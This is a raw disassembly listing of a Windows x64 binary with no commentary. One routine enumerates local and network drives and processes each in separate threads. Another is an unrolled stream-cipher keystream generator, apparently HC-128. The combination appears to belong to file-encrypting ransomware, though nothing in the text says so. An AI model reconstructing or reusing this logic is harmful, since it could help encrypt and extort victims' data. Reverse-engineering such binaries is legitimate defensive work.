   14000560b:	e8 a0 41 00 00       	call   0x1400097b0
   140005610:	4c 8b e0             	mov    %rax,%r12
   140005613:	48 85 c0             	test   %rax,%rax
   140005616:	0f 84 19 03 00 00    	je     0x140005935
   14000561c:	45 85 ff             	test   %r15d,%r15d
   14000561f:	74 3a                	je     0x14000565b
   140005621:	48 8b d8             	mov    %rax,%rbx
   140005624:	0f 1f 40 00          	nopl   0x0(%rax)
   140005628:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000562f:	00 
   140005630:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140005635:	4c 8d 05 a4 f8 ff ff 	lea    -0x75c(%rip),%r8        # 0x140004ee0
   14000563c:	45 33 c9             	xor    %r9d,%r9d
   14000563f:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140005644:	33 d2                	xor    %edx,%edx
   140005646:	33 c9                	xor    %ecx,%ecx
   140005648:	ff 15 52 7a 00 00    	call   *0x7a52(%rip)        # 0x14000d0a0
   14000564e:	48 89 03             	mov    %rax,(%rbx)
   140005651:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   140005655:	48 83 ef 01          	sub    $0x1,%rdi
   140005659:	75 d5                	jne    0x140005630
   14000565b:	8b 5c 24 30          	mov    0x30(%rsp),%ebx
   14000565f:	4c 8d 05 aa bd ff ff 	lea    -0x4256(%rip),%r8        # 0x140001410
   140005666:	8b cb                	mov    %ebx,%ecx
   140005668:	48 89 b4 24 a8 00 00 	mov    %rsi,0xa8(%rsp)
   14000566f:	00 
   140005670:	48 8b d5             	mov    %rbp,%rdx
   140005673:	e8 48 ca ff ff       	call   0x1400020c0
   140005678:	48 8b f8             	mov    %rax,%rdi
   14000567b:	48 85 c0             	test   %rax,%rax
   14000567e:	74 7f                	je     0x1400056ff
   140005680:	48 8b c8             	mov    %rax,%rcx
   140005683:	be 01 00 00 00       	mov    $0x1,%esi
   140005688:	ff 15 a2 79 00 00    	call   *0x79a2(%rip)        # 0x14000d030
   14000568e:	48 63 d0             	movslq %eax,%rdx
   140005691:	85 c0                	test   %eax,%eax
   140005693:	7e 1b                	jle    0x1400056b0
   140005695:	49 8b ce             	mov    %r14,%rcx
   140005698:	66 83 3c 4f 2c       	cmpw   $0x2c,(%rdi,%rcx,2)
   14000569d:	75 07                	jne    0x1400056a6
   14000569f:	66 44 89 34 4f       	mov    %r14w,(%rdi,%rcx,2)
   1400056a4:	ff c6                	inc    %esi
   1400056a6:	48 ff c1             	inc    %rcx
   1400056a9:	48 3b ca             	cmp    %rdx,%rcx
   1400056ac:	7c ea                	jl     0x140005698
   1400056ae:	66 90                	xchg   %ax,%ax
   1400056b0:	48 8b cf             	mov    %rdi,%rcx
   1400056b3:	ff 15 77 79 00 00    	call   *0x7977(%rip)        # 0x14000d030
   1400056b9:	ff c0                	inc    %eax
   1400056bb:	48 63 c8             	movslq %eax,%rcx
   1400056be:	48 03 c9             	add    %rcx,%rcx
   1400056c1:	e8 ea 40 00 00       	call   0x1400097b0
   1400056c6:	48 8b d7             	mov    %rdi,%rdx
   1400056c9:	48 8b c8             	mov    %rax,%rcx
   1400056cc:	48 8b d8             	mov    %rax,%rbx
   1400056cf:	ff 15 eb 79 00 00    	call   *0x79eb(%rip)        # 0x14000d0c0
   1400056d5:	48 8b cb             	mov    %rbx,%rcx
   1400056d8:	e8 33 fc ff ff       	call   0x140005310
   1400056dd:	48 8b cb             	mov    %rbx,%rcx
   1400056e0:	e8 ab 40 00 00       	call   0x140009790
   1400056e5:	48 8b cf             	mov    %rdi,%rcx
   1400056e8:	ff 15 42 79 00 00    	call   *0x7942(%rip)        # 0x14000d030
   1400056ee:	ff c0                	inc    %eax
   1400056f0:	48 98                	cltq
   1400056f2:	48 8d 3c 47          	lea    (%rdi,%rax,2),%rdi
   1400056f6:	83 ee 01             	sub    $0x1,%esi
   1400056f9:	75 b5                	jne    0x1400056b0
   1400056fb:	8b 5c 24 30          	mov    0x30(%rsp),%ebx
   1400056ff:	4c 8d 05 1a bd ff ff 	lea    -0x42e6(%rip),%r8        # 0x140001420
   140005706:	48 8b d5             	mov    %rbp,%rdx
   140005709:	8b cb                	mov    %ebx,%ecx
   14000570b:	e8 b0 c9 ff ff       	call   0x1400020c0
   140005710:	48 8b f8             	mov    %rax,%rdi
   140005713:	48 85 c0             	test   %rax,%rax
   140005716:	74 79                	je     0x140005791
   140005718:	48 8b c8             	mov    %rax,%rcx
   14000571b:	be 01 00 00 00       	mov    $0x1,%esi
   140005720:	ff 15 0a 79 00 00    	call   *0x790a(%rip)        # 0x14000d030
   140005726:	48 63 d0             	movslq %eax,%rdx
   140005729:	85 c0                	test   %eax,%eax
   14000572b:	7e 19                	jle    0x140005746
   14000572d:	49 8b ce             	mov    %r14,%rcx
   140005730:	66 83 3c 4f 2c       	cmpw   $0x2c,(%rdi,%rcx,2)
   140005735:	75 07                	jne    0x14000573e
   140005737:	66 44 89 34 4f       	mov    %r14w,(%rdi,%rcx,2)
   14000573c:	ff c6                	inc    %esi
   14000573e:	48 ff c1             	inc    %rcx
   140005741:	48 3b ca             	cmp    %rdx,%rcx
   140005744:	7c ea                	jl     0x140005730
   140005746:	48 8b cf             	mov    %rdi,%rcx
   140005749:	ff 15 e1 78 00 00    	call   *0x78e1(%rip)        # 0x14000d030
   14000574f:	ff c0                	inc    %eax
   140005751:	48 63 c8             	movslq %eax,%rcx
   140005754:	48 03 c9             	add    %rcx,%rcx
   140005757:	e8 54 40 00 00       	call   0x1400097b0
   14000575c:	48 8b d7             	mov    %rdi,%rdx
   14000575f:	48 8b c8             	mov    %rax,%rcx
   140005762:	48 8b d8             	mov    %rax,%rbx
   140005765:	ff 15 55 79 00 00    	call   *0x7955(%rip)        # 0x14000d0c0
   14000576b:	48 8b cb             	mov    %rbx,%rcx
   14000576e:	e8 ad f7 ff ff       	call   0x140004f20
   140005773:	48 8b cb             	mov    %rbx,%rcx
   140005776:	e8 15 40 00 00       	call   0x140009790
   14000577b:	48 8b cf             	mov    %rdi,%rcx
   14000577e:	ff 15 ac 78 00 00    	call   *0x78ac(%rip)        # 0x14000d030
   140005784:	ff c0                	inc    %eax
   140005786:	48 98                	cltq
   140005788:	48 8d 3c 47          	lea    (%rdi,%rax,2),%rdi
   14000578c:	83 ee 01             	sub    $0x1,%esi
   14000578f:	75 b5                	jne    0x140005746
   140005791:	48 8d 15 98 bc ff ff 	lea    -0x4368(%rip),%rdx        # 0x140001430
   140005798:	49 8b cd             	mov    %r13,%rcx
   14000579b:	ff 15 2f 79 00 00    	call   *0x792f(%rip)        # 0x14000d0d0
   1400057a1:	85 c0                	test   %eax,%eax
   1400057a3:	75 07                	jne    0x1400057ac
   1400057a5:	33 c9                	xor    %ecx,%ecx
   1400057a7:	e8 34 fa ff ff       	call   0x1400051e0
   1400057ac:	ff 15 56 78 00 00    	call   *0x7856(%rip)        # 0x14000d008
   1400057b2:	8b e8                	mov    %eax,%ebp
   1400057b4:	85 c0                	test   %eax,%eax
   1400057b6:	0f 84 dd 00 00 00    	je     0x140005899
   1400057bc:	be 41 00 00 00       	mov    $0x41,%esi
   1400057c1:	40 f6 c5 01          	test   $0x1,%bpl
   1400057c5:	0f 84 bf 00 00 00    	je     0x14000588a
   1400057cb:	b9 0e 00 00 00       	mov    $0xe,%ecx
   1400057d0:	e8 db 3f 00 00       	call   0x1400097b0
   1400057d5:	48 8b d8             	mov    %rax,%rbx
   1400057d8:	48 85 c0             	test   %rax,%rax
   1400057db:	0f 84 a9 00 00 00    	je     0x14000588a
   1400057e1:	48 8d 15 58 bc ff ff 	lea    -0x43a8(%rip),%rdx        # 0x140001440
   1400057e8:	48 8b c8             	mov    %rax,%rcx
   1400057eb:	ff 15 cf 78 00 00    	call   *0x78cf(%rip)        # 0x14000d0c0
   1400057f1:	48 8d 4b 0a          	lea    0xa(%rbx),%rcx
   1400057f5:	48 8d 15 50 bc ff ff 	lea    -0x43b0(%rip),%rdx        # 0x14000144c
   1400057fc:	ff 15 be 78 00 00    	call   *0x78be(%rip)        # 0x14000d0c0
   140005802:	48 8b cb             	mov    %rbx,%rcx
   140005805:	66 89 73 08          	mov    %si,0x8(%rbx)
   140005809:	ff 15 c9 78 00 00    	call   *0x78c9(%rip)        # 0x14000d0d8
   14000580f:	85 c0                	test   %eax,%eax
   140005811:	74 6f                	je     0x140005882
   140005813:	83 f8 05             	cmp    $0x5,%eax
   140005816:	74 6a                	je     0x140005882
   140005818:	83 f8 04             	cmp    $0x4,%eax
   14000581b:	74 25                	je     0x140005842
   14000581d:	48 8b cb             	mov    %rbx,%rcx
   140005820:	e8 fb f6 ff ff       	call   0x140004f20
   140005825:	eb 5b                	jmp    0x140005882
   140005827:	48 8d 48 02          	lea    0x2(%rax),%rcx
   14000582b:	48 85 c9             	test   %rcx,%rcx
   14000582e:	0f 84 71 fd ff ff    	je     0x1400055a5
   140005834:	e8 87 f0 ff ff       	call   0x1400048c0
   140005839:	33 c9                	xor    %ecx,%ecx
   14000583b:	ff 15 77 78 00 00    	call   *0x7877(%rip)        # 0x14000d0b8
   140005841:	cc                   	int3
   140005842:	b9 08 02 00 00       	mov    $0x208,%ecx
   140005847:	c7 44 24 34 04 01 00 	movl   $0x104,0x34(%rsp)
   14000584e:	00 
   14000584f:	e8 5c 3f 00 00       	call   0x1400097b0
   140005854:	48 8b f8             	mov    %rax,%rdi
   140005857:	48 85 c0             	test   %rax,%rax
   14000585a:	74 26                	je     0x140005882
   14000585c:	4c 8d 44 24 34       	lea    0x34(%rsp),%r8
   140005861:	48 8b d0             	mov    %rax,%rdx
   140005864:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140005868:	ff 15 0a 79 00 00    	call   *0x790a(%rip)        # 0x14000d178
   14000586e:	85 c0                	test   %eax,%eax
   140005870:	75 10                	jne    0x140005882
   140005872:	48 8b cf             	mov    %rdi,%rcx
   140005875:	e8 a6 f6 ff ff       	call   0x140004f20
   14000587a:	48 8b cf             	mov    %rdi,%rcx
   14000587d:	e8 0e 3f 00 00       	call   0x140009790
   140005882:	48 8b cb             	mov    %rbx,%rcx
   140005885:	e8 06 3f 00 00       	call   0x140009790
   14000588a:	d1 ed                	shr    $1,%ebp
   14000588c:	66 ff c6             	inc    %si
   14000588f:	66 83 fe 5a          	cmp    $0x5a,%si
   140005893:	0f 86 28 ff ff ff    	jbe    0x1400057c1
   140005899:	48 8d 15 b0 bb ff ff 	lea    -0x4450(%rip),%rdx        # 0x140001450
   1400058a0:	49 8b cd             	mov    %r13,%rcx
   1400058a3:	ff 15 27 78 00 00    	call   *0x7827(%rip)        # 0x14000d0d0
   1400058a9:	48 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%rsi
   1400058b0:	00 
   1400058b1:	85 c0                	test   %eax,%eax
   1400058b3:	74 05                	je     0x1400058ba
   1400058b5:	4d 85 ed             	test   %r13,%r13
   1400058b8:	75 07                	jne    0x1400058c1
   1400058ba:	33 c9                	xor    %ecx,%ecx
   1400058bc:	e8 1f f9 ff ff       	call   0x1400051e0
   1400058c1:	45 85 ff             	test   %r15d,%r15d
   1400058c4:	74 4f                	je     0x140005915
   1400058c6:	41 8b df             	mov    %r15d,%ebx
   1400058c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400058d0:	33 c9                	xor    %ecx,%ecx
   1400058d2:	e8 99 3f 00 00       	call   0x140009870
   1400058d7:	48 83 eb 01          	sub    $0x1,%rbx
   1400058db:	75 f3                	jne    0x1400058d0
   1400058dd:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   1400058e3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400058e9:	49 8b d4             	mov    %r12,%rdx
   1400058ec:	41 8b cf             	mov    %r15d,%ecx
   1400058ef:	ff 15 4b 77 00 00    	call   *0x774b(%rip)        # 0x14000d040
   1400058f5:	49 8b dc             	mov    %r12,%rbx
   1400058f8:	41 8b ff             	mov    %r15d,%edi
   1400058fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005900:	48 8b 0b             	mov    (%rbx),%rcx
   140005903:	ff 15 87 77 00 00    	call   *0x7787(%rip)        # 0x14000d090
   140005909:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   14000590d:	48 83 ef 01          	sub    $0x1,%rdi
   140005911:	75 ed                	jne    0x140005900
   140005913:	eb 18                	jmp    0x14000592d
   140005915:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   14000591b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005921:	49 8b d4             	mov    %r12,%rdx
   140005924:	41 8b cf             	mov    %r15d,%ecx
   140005927:	ff 15 13 77 00 00    	call   *0x7713(%rip)        # 0x14000d040
   14000592d:	49 8b cc             	mov    %r12,%rcx
   140005930:	e8 5b 3e 00 00       	call   0x140009790
   140005935:	45 33 c9             	xor    %r9d,%r9d
   140005938:	48 8d 15 21 bb ff ff 	lea    -0x44df(%rip),%rdx        # 0x140001460
   14000593f:	45 33 c0             	xor    %r8d,%r8d
   140005942:	33 c9                	xor    %ecx,%ecx
   140005944:	ff 15 7e 78 00 00    	call   *0x787e(%rip)        # 0x14000d1c8
   14000594a:	33 c9                	xor    %ecx,%ecx
   14000594c:	ff 15 66 77 00 00    	call   *0x7766(%rip)        # 0x14000d0b8
   140005952:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140005957:	4c 8b 6c 24 78       	mov    0x78(%rsp),%r13
   14000595c:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140005963:	00 
   140005964:	48 8b bc 24 b0 00 00 	mov    0xb0(%rsp),%rdi
   14000596b:	00 
   14000596c:	33 c9                	xor    %ecx,%ecx
   14000596e:	ff 15 44 77 00 00    	call   *0x7744(%rip)        # 0x14000d0b8
   140005974:	cc                   	int3
   140005975:	cc                   	int3
   140005976:	cc                   	int3
   140005977:	cc                   	int3
   140005978:	cc                   	int3
   140005979:	cc                   	int3
   14000597a:	cc                   	int3
   14000597b:	cc                   	int3
   14000597c:	cc                   	int3
   14000597d:	cc                   	int3
   14000597e:	cc                   	int3
   14000597f:	cc                   	int3
   140005980:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005985:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000598a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000598f:	44 8b 81 80 10 00 00 	mov    0x1080(%rcx),%r8d
   140005996:	48 8b f2             	mov    %rdx,%rsi
   140005999:	41 8b d8             	mov    %r8d,%ebx
   14000599c:	4c 8b d9             	mov    %rcx,%r11
   14000599f:	81 e3 ff 01 00 00    	and    $0x1ff,%ebx
   1400059a5:	41 8d 40 10          	lea    0x10(%r8),%eax
   1400059a9:	25 ff 03 00 00       	and    $0x3ff,%eax
   1400059ae:	8d 7b 10             	lea    0x10(%rbx),%edi
   1400059b1:	89 81 80 10 00 00    	mov    %eax,0x1080(%rcx)
   1400059b7:	81 e7 ff 01 00 00    	and    $0x1ff,%edi
   1400059bd:	41 81 f8 00 02 00 00 	cmp    $0x200,%r8d
   1400059c4:	0f 83 b9 05 00 00    	jae    0x140005f83
   1400059ca:	8b 91 10 10 00 00    	mov    0x1010(%rcx),%edx
   1400059d0:	8b c2                	mov    %edx,%eax
   1400059d2:	c1 e8 10             	shr    $0x10,%eax
   1400059d5:	0f b6 c8             	movzbl %al,%ecx
   1400059d8:	0f b6 c2             	movzbl %dl,%eax
   1400059db:	49 8d 14 9b          	lea    (%r11,%rbx,4),%rdx
   1400059df:	45 8b 84 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%r8d
   1400059e6:	00 
   1400059e7:	45 03 84 83 00 08 00 	add    0x800(%r11,%rax,4),%r8d
   1400059ee:	00 
   1400059ef:	8d 43 01             	lea    0x1(%rbx),%eax
   1400059f2:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   1400059f6:	4d 8d 14 83          	lea    (%r11,%rax,4),%r10
   1400059fa:	41 8b 83 34 10 00 00 	mov    0x1034(%r11),%eax
   140005a01:	c1 c8 0a             	ror    $0xa,%eax
   140005a04:	c1 c9 17             	ror    $0x17,%ecx
   140005a07:	33 c8                	xor    %eax,%ecx
   140005a09:	41 8b 83 18 10 00 00 	mov    0x1018(%r11),%eax
   140005a10:	c1 c8 08             	ror    $0x8,%eax
   140005a13:	03 c8                	add    %eax,%ecx
   140005a15:	03 0a                	add    (%rdx),%ecx
   140005a17:	89 0a                	mov    %ecx,(%rdx)
   140005a19:	41 89 8b 00 10 00 00 	mov    %ecx,0x1000(%r11)
   140005a20:	44 33 02             	xor    (%rdx),%r8d
   140005a23:	41 8b 93 14 10 00 00 	mov    0x1014(%r11),%edx
   140005a2a:	8b c2                	mov    %edx,%eax
   140005a2c:	44 89 06             	mov    %r8d,(%rsi)
   140005a2f:	c1 e8 10             	shr    $0x10,%eax
   140005a32:	0f b6 c8             	movzbl %al,%ecx
   140005a35:	0f b6 c2             	movzbl %dl,%eax
   140005a38:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005a3f:	00 
   140005a40:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005a47:	00 
   140005a48:	8d 43 02             	lea    0x2(%rbx),%eax
   140005a4b:	41 8b 8b 38 10 00 00 	mov    0x1038(%r11),%ecx
   140005a52:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140005a56:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   140005a5a:	c1 c8 17             	ror    $0x17,%eax
   140005a5d:	c1 c9 0a             	ror    $0xa,%ecx
   140005a60:	33 c8                	xor    %eax,%ecx
   140005a62:	41 8b 83 1c 10 00 00 	mov    0x101c(%r11),%eax
   140005a69:	c1 c8 08             	ror    $0x8,%eax
   140005a6c:	03 c8                	add    %eax,%ecx
   140005a6e:	41 01 0a             	add    %ecx,(%r10)
   140005a71:	41 8b 02             	mov    (%r10),%eax
   140005a74:	41 89 83 04 10 00 00 	mov    %eax,0x1004(%r11)
   140005a7b:	41 33 12             	xor    (%r10),%edx
   140005a7e:	89 56 04             	mov    %edx,0x4(%rsi)
   140005a81:	41 8b 93 18 10 00 00 	mov    0x1018(%r11),%edx
   140005a88:	8b c2                	mov    %edx,%eax
   140005a8a:	c1 e8 10             	shr    $0x10,%eax
   140005a8d:	0f b6 c8             	movzbl %al,%ecx
   140005a90:	0f b6 c2             	movzbl %dl,%eax
   140005a93:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005a9a:	00 
   140005a9b:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005aa2:	00 
   140005aa3:	8d 43 03             	lea    0x3(%rbx),%eax
   140005aa6:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140005aaa:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   140005aae:	41 8b 83 3c 10 00 00 	mov    0x103c(%r11),%eax
   140005ab5:	c1 c8 0a             	ror    $0xa,%eax
   140005ab8:	c1 c9 17             	ror    $0x17,%ecx
   140005abb:	33 c8                	xor    %eax,%ecx
   140005abd:	41 8b 83 20 10 00 00 	mov    0x1020(%r11),%eax
   140005ac4:	c1 c8 08             	ror    $0x8,%eax
   140005ac7:	03 c8                	add    %eax,%ecx
   140005ac9:	41 01 09             	add    %ecx,(%r9)
   140005acc:	41 8b 01             	mov    (%r9),%eax
   140005acf:	41 89 83 08 10 00 00 	mov    %eax,0x1008(%r11)
   140005ad6:	41 33 11             	xor    (%r9),%edx
   140005ad9:	89 56 08             	mov    %edx,0x8(%rsi)
   140005adc:	41 8b 93 1c 10 00 00 	mov    0x101c(%r11),%edx
   140005ae3:	8b c2                	mov    %edx,%eax
   140005ae5:	c1 e8 10             	shr    $0x10,%eax
   140005ae8:	0f b6 c8             	movzbl %al,%ecx
   140005aeb:	0f b6 c2             	movzbl %dl,%eax
   140005aee:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005af5:	00 
   140005af6:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005afd:	00 
   140005afe:	8d 43 04             	lea    0x4(%rbx),%eax
   140005b01:	41 8b 8b 00 10 00 00 	mov    0x1000(%r11),%ecx
   140005b08:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140005b0c:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   140005b10:	c1 c8 17             	ror    $0x17,%eax
   140005b13:	c1 c9 0a             	ror    $0xa,%ecx
   140005b16:	33 c8                	xor    %eax,%ecx
   140005b18:	41 8b 83 24 10 00 00 	mov    0x1024(%r11),%eax
   140005b1f:	c1 c8 08             	ror    $0x8,%eax
   140005b22:	03 c8                	add    %eax,%ecx
   140005b24:	41 01 08             	add    %ecx,(%r8)
   140005b27:	41 8b 00             	mov    (%r8),%eax
   140005b2a:	41 89 83 0c 10 00 00 	mov    %eax,0x100c(%r11)
   140005b31:	41 33 10             	xor    (%r8),%edx
   140005b34:	89 56 0c             	mov    %edx,0xc(%rsi)
   140005b37:	41 8b 93 20 10 00 00 	mov    0x1020(%r11),%edx
   140005b3e:	8b c2                	mov    %edx,%eax
   140005b40:	c1 e8 10             	shr    $0x10,%eax
   140005b43:	0f b6 c8             	movzbl %al,%ecx
   140005b46:	0f b6 c2             	movzbl %dl,%eax
   140005b49:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005b50:	00 
   140005b51:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005b58:	00 
   140005b59:	8d 43 05             	lea    0x5(%rbx),%eax
   140005b5c:	41 8b 8b 04 10 00 00 	mov    0x1004(%r11),%ecx
   140005b63:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   140005b67:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   140005b6b:	c1 c8 17             	ror    $0x17,%eax
   140005b6e:	c1 c9 0a             	ror    $0xa,%ecx
   140005b71:	33 c8                	xor    %eax,%ecx
   140005b73:	41 8b 83 28 10 00 00 	mov    0x1028(%r11),%eax
   140005b7a:	c1 c8 08             	ror    $0x8,%eax
   140005b7d:	03 c8                	add    %eax,%ecx
   140005b7f:	41 01 09             	add    %ecx,(%r9)
   140005b82:	41 8b 01             	mov    (%r9),%eax
   140005b85:	41 89 83 10 10 00 00 	mov    %eax,0x1010(%r11)
   140005b8c:	41 33 11             	xor    (%r9),%edx
   140005b8f:	89 56 10             	mov    %edx,0x10(%rsi)
   140005b92:	41 8b 93 24 10 00 00 	mov    0x1024(%r11),%edx
   140005b99:	8b c2                	mov    %edx,%eax
   140005b9b:	c1 e8 10             	shr    $0x10,%eax
   140005b9e:	0f b6 c8             	movzbl %al,%ecx
   140005ba1:	0f b6 c2             	movzbl %dl,%eax
   140005ba4:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005bab:	00 
   140005bac:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005bb3:	00 
   140005bb4:	8d 43 06             	lea    0x6(%rbx),%eax
   140005bb7:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140005bbb:	4d 8d 14 83          	lea    (%r11,%rax,4),%r10
   140005bbf:	41 8b 83 08 10 00 00 	mov    0x1008(%r11),%eax
   140005bc6:	c1 c8 0a             	ror    $0xa,%eax
   140005bc9:	c1 c9 17             	ror    $0x17,%ecx
   140005bcc:	33 c8                	xor    %eax,%ecx
   140005bce:	41 8b 83 2c 10 00 00 	mov    0x102c(%r11),%eax
   140005bd5:	c1 c8 08             	ror    $0x8,%eax
   140005bd8:	03 c8                	add    %eax,%ecx
   140005bda:	41 01 08             	add    %ecx,(%r8)
   140005bdd:	41 8b 00             	mov    (%r8),%eax
   140005be0:	41 89 83 14 10 00 00 	mov    %eax,0x1014(%r11)
   140005be7:	41 33 10             	xor    (%r8),%edx
   140005bea:	89 56 14             	mov    %edx,0x14(%rsi)
   140005bed:	41 8b 93 28 10 00 00 	mov    0x1028(%r11),%edx
   140005bf4:	8b c2                	mov    %edx,%eax
   140005bf6:	c1 e8 10             	shr    $0x10,%eax
   140005bf9:	0f b6 c8             	movzbl %al,%ecx
   140005bfc:	0f b6 c2             	movzbl %dl,%eax
   140005bff:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005c06:	00 
   140005c07:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005c0e:	00 
   140005c0f:	8d 43 07             	lea    0x7(%rbx),%eax
   140005c12:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140005c16:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140005c1a:	41 8b 83 0c 10 00 00 	mov    0x100c(%r11),%eax
   140005c21:	c1 c8 0a             	ror    $0xa,%eax
   140005c24:	c1 c9 17             	ror    $0x17,%ecx
   140005c27:	33 c8                	xor    %eax,%ecx
   140005c29:	41 8b 83 30 10 00 00 	mov    0x1030(%r11),%eax
   140005c30:	c1 c8 08             	ror    $0x8,%eax
   140005c33:	03 c8                	add    %eax,%ecx
   140005c35:	41 01 0a             	add    %ecx,(%r10)
   140005c38:	41 8b 02             	mov    (%r10),%eax
   140005c3b:	41 89 83 18 10 00 00 	mov    %eax,0x1018(%r11)
   140005c42:	41 33 12             	xor    (%r10),%edx
   140005c45:	89 56 18             	mov    %edx,0x18(%rsi)
   140005c48:	41 8b 93 2c 10 00 00 	mov    0x102c(%r11),%edx
   140005c4f:	8b c2                	mov    %edx,%eax
   140005c51:	c1 e8 10             	shr    $0x10,%eax
   140005c54:	0f b6 c8             	movzbl %al,%ecx
   140005c57:	0f b6 c2             	movzbl %dl,%eax
   140005c5a:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005c61:	00 
   140005c62:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005c69:	00 
   140005c6a:	41 8b 8b 10 10 00 00 	mov    0x1010(%r11),%ecx
   140005c71:	8d 43 08             	lea    0x8(%rbx),%eax
   140005c74:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   140005c78:	c1 c9 0a             	ror    $0xa,%ecx
   140005c7b:	41 8b 00             	mov    (%r8),%eax
   140005c7e:	c1 c8 17             	ror    $0x17,%eax
   140005c81:	33 c8                	xor    %eax,%ecx
   140005c83:	41 8b 83 34 10 00 00 	mov    0x1034(%r11),%eax
   140005c8a:	c1 c8 08             	ror    $0x8,%eax
   140005c8d:	03 c8                	add    %eax,%ecx
   140005c8f:	41 01 09             	add    %ecx,(%r9)
   140005c92:	41 8b 01             	mov    (%r9),%eax
   140005c95:	41 89 83 1c 10 00 00 	mov    %eax,0x101c(%r11)
   140005c9c:	41 33 11             	xor    (%r9),%edx
   140005c9f:	89 56 1c             	mov    %edx,0x1c(%rsi)
   140005ca2:	41 8b 93 30 10 00 00 	mov    0x1030(%r11),%edx
   140005ca9:	8b c2                	mov    %edx,%eax
   140005cab:	c1 e8 10             	shr    $0x10,%eax
   140005cae:	0f b6 c8             	movzbl %al,%ecx
   140005cb1:	0f b6 c2             	movzbl %dl,%eax
   140005cb4:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005cbb:	00 
   140005cbc:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005cc3:	00 
   140005cc4:	8d 43 09             	lea    0x9(%rbx),%eax
   140005cc7:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140005ccb:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140005ccf:	41 8b 83 14 10 00 00 	mov    0x1014(%r11),%eax
   140005cd6:	c1 c8 0a             	ror    $0xa,%eax
   140005cd9:	c1 c9 17             	ror    $0x17,%ecx
   140005cdc:	33 c8                	xor    %eax,%ecx
   140005cde:	41 8b 83 38 10 00 00 	mov    0x1038(%r11),%eax
   140005ce5:	c1 c8 08             	ror    $0x8,%eax
   140005ce8:	03 c8                	add    %eax,%ecx
   140005cea:	41 01 08             	add    %ecx,(%r8)
   140005ced:	41 8b 00             	mov    (%r8),%eax
   140005cf0:	41 89 83 20 10 00 00 	mov    %eax,0x1020(%r11)
   140005cf7:	41 33 10             	xor    (%r8),%edx
   140005cfa:	89 56 20             	mov    %edx,0x20(%rsi)
   140005cfd:	41 8b 93 34 10 00 00 	mov    0x1034(%r11),%edx
   140005d04:	8b c2                	mov    %edx,%eax
   140005d06:	c1 e8 10             	shr    $0x10,%eax
   140005d09:	0f b6 c8             	movzbl %al,%ecx
   140005d0c:	0f b6 c2             	movzbl %dl,%eax
   140005d0f:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005d16:	00 
   140005d17:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005d1e:	00 
   140005d1f:	8d 43 0a             	lea    0xa(%rbx),%eax
   140005d22:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140005d26:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   140005d2a:	41 8b 83 18 10 00 00 	mov    0x1018(%r11),%eax
   140005d31:	c1 c8 0a             	ror    $0xa,%eax
   140005d34:	c1 c9 17             	ror    $0x17,%ecx
   140005d37:	33 c8                	xor    %eax,%ecx
   140005d39:	41 8b 83 3c 10 00 00 	mov    0x103c(%r11),%eax
   140005d40:	c1 c8 08             	ror    $0x8,%eax
   140005d43:	03 c8                	add    %eax,%ecx
   140005d45:	41 01 09             	add    %ecx,(%r9)
   140005d48:	41 8b 01             	mov    (%r9),%eax
   140005d4b:	41 89 83 24 10 00 00 	mov    %eax,0x1024(%r11)
